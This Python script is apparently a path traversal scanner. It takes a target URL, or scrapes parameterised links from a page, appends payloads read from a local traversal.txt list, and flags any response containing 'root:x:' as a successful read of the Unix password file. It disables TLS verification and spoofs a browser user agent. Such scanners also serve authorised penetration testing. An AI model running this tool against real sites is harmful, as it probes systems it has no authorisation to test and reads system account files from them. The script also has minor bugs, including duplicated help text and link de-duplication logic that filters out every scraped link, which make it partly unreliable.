from colorama import Fore
from urllib.parse import urljoin
import requests
import re
import sys
import os
import argparse

requests.packages.urllib3.disable_warnings()


user_agent_ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
header = {"User-Agent": user_agent_}

parser = argparse.ArgumentParser()

parser.add_argument('-t', '--target',
                   help="Target to scan",
                   metavar="https://www.domain.com")
parser.add_argument('-p', '--parameters',
                   help="Target to scan",
                   metavar="https://www.domain.com")

args = parser.parse_args()

if args.target:
    cdir = os.getcwd()
    with open(f"{cdir}/payloads/traversal.txt", "r") as f:
        path_traversal_list = [x.strip() for x in f.readlines()]
    vulnerable = []
    for path_traversal in path_traversal_list:
        s = requests.Session()
        r = s.get(f"{args.target}{path_traversal}", verify=False, headers=header)
        if r.status_code == 200 and "root:x:" in r.text:
            vulnerable.append(f"{args.target}{path_traversal}")
        else:
            print(f"{Fore.RED}[-] {Fore.GREEN}{args.target}{Fore.CYAN}{path_traversal}")
    if vulnerable:
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Path_Traversal: {Fore.GREEN}{', '.join(map(str,vulnerable))}")


if args.parameters:
    try:
        s = requests.Session()
        r = s.get(args.parameters, verify=False, headers=header)
        content = r.content
        links = re.findall('(?:href=")(.*?)"', content.decode('utf-8'))
        links2 =  re.findall('(?:src=")(.*?)"', content.decode('utf-8'))
        duplicatelinks = set(links)
        params_links = []
        for link in links:
            link = urljoin(args.parameters, link)
            if link not in duplicatelinks:
                if "=" in link:
                    params_links.append(link + "\n")
        for src_links in links2:
            src_links = urljoin(args.parameters, src_links)
            if src_links not in duplicatelinks:
                if "=" in src_links:
                    params_links.append(src_links + "\n")
        parameters_list: list[str] = []
        vulnerable: list[str] = []
        for params2 in params_links:
            parameters = params2.split("=")[0]
            parameters_list.append(f"{parameters}=")
        print(f"{Fore.MAGENTA}Parameters found: {Fore.YELLOW}{', '.join(map(str,parameters_list))}\n")
        cdir = os.getcwd()
        with open(f"{cdir}/payloads/traversal.txt", "r") as f:
            path_traversal_list = [x.strip() for x in f.readlines()]
        for parameterslist in parameters_list:
            for path_list in path_traversal_list:
                r_traversal = requests.get(f"{parameterslist}{path_list}", verify=False, headers=header)
                if r_traversal.status_code == 200 and "root:x:" in r_traversal.text:
                    vulnerable.append(f"{parameterslist}{path_list}")
                else:
                    print(f"{Fore.RED}[-] {Fore.GREEN}{parameterslist}{Fore.CYAN}{path_list}")

        if vulnerable:
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Path_Traversal: {Fore.GREEN}{', '.join(map(str,vulnerable))}")



    except requests.exceptions.ConnectionError:
        print (Fore.RED + "Connection Error")
    except requests.exceptions.MissingSchema:
        print (Fore.RED + "Please use: http://site.com")